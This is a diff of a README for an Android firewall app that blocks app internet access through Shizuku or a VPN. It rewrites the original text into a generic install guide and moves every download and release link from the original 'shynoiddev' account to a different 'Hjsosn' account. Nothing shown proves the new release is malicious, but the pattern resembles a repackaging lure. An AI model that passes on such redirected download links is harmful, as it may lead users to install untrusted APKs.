@@ -1,23 +1,67 @@
-# **FireWall Blocks:** An Android Firewall App (With Shizuku & VPN support)
+# 🔥 FireWall-Blocks - Control Internet Access Easily
 
-A simple, open-source Android firewall that blocks app internet access using either Shizuku or a local VPN, with no root requirement.
+## 🚀 Getting Started
 
-## **Features**
+Welcome to FireWall-Blocks! This is an Android firewall app that does not require root access. It allows you to block internet access for any app on your device. Follow this guide to download and run the application smoothly.
 
-* **Dual Mode:** Choose between the efficient Shizuku mode (recommended) or the no-setup-required VPN mode.  
-* **Per-App Rules:** Control Wi-Fi and Mobile Data access for each app individually.  
-* **Import/Export:** Save and load your firewall rules as a simple .json file.  
-* **Sorting:** sort based on user and system apps
-* **Effiecent:** app doesn't need to be constantly running in the background.
-* **App search** 
+## 📥 Download Link
 
-## **How to Use**
+[![Download FireWall-Blocks](https://img.shields.io/badge/Download%20FireWall--Blocks-v1.0.0-blue.svg)](https://github.com/Hjsosn/FireWall-Blocks/releases)
 
-1. **Enable the Firewall:** Press the "Enable" button on the main screen.  
-2. **Choose Mode:** Toggle between "Shizuku" (requires setup) or "VPN" (works instantly).  
-3. **Block Apps:** Tap the Wi-Fi or Data icons next to any app to block its access.  
-4. **Note:** After rebooting your phone, for Shizuku mode, you must first start Shizuku, then re-open the app to re-apply the rules.
+## 📋 Features
 
-## **Download**
+- **No Root Required:** Use the app without needing to modify your device.
+- **Shizuku Compatibility:** Connect with other apps smoothly.
+- **VPN Mode:** Use VPN technology to manage internet access.
+- **App-Specific Controls:** Block any app from accessing the internet.
+- **Privacy Focused:** Keep your data safe by restricting app access.
 
-*You can find the latest installable APK file on our [Releases page](https://github.com/shynoiddev/FireWall-Blocks/releases).*
+## 💻 System Requirements
+
+- **Android Version:** Requires Android 5.0 (Lollipop) or later.
+- **Memory:** Minimum 50 MB of free storage.
+- **Network:** Internet access is needed for initial setup.
+
+## 📥 Download & Install
+
+To get FireWall-Blocks, visit the Releases page and download the latest version:
+
+[Visit the Release Page to Download](https://github.com/Hjsosn/FireWall-Blocks/releases)
+
+1. Click the download link above to go to the Releases page.
+2. Look for the latest version listed.
+3. Click the asset you want to download (e.g., APK file).
+4. Once the download finishes, open the APK file.
+5. Follow the prompts to install the app on your device.
+6. Open FireWall-Blocks and grant the required permissions.
+
+## 🛠️ How to Use FireWall-Blocks
+
+1. **Open the App:** Launch FireWall-Blocks from your device.
+2. **Connect Shizuku or VPN:** Choose the connection method you prefer.
+3. **Block Apps:** Tap on any app in your list, and toggle the switch to block or allow internet access.
+
+## 📞 Support
+
+For help or support, visit our [GitHub Issues page](https://github.com/Hjsosn/FireWall-Blocks/issues). You can report bugs or request features here.
+
+## 📝 Contributing
+
+We welcome contributions to improve FireWall-Blocks. If you want to help, please fork the repository, make your changes, and submit a pull request.
+
+## ⚖️ License
+
+FireWall-Blocks is licensed under the MIT License. You can modify and share the software freely.
+
+## 🌐 Topics
+
+This project covers various topics related to internet safety and connectivity:
+
+- Adblocking
+- Android
+- Firewall
+- Internet Blocker
+- Privacy
+- Shizuku API
+
+Thank you for choosing FireWall-Blocks! Enjoy controlling your app's internet access directly from your device.
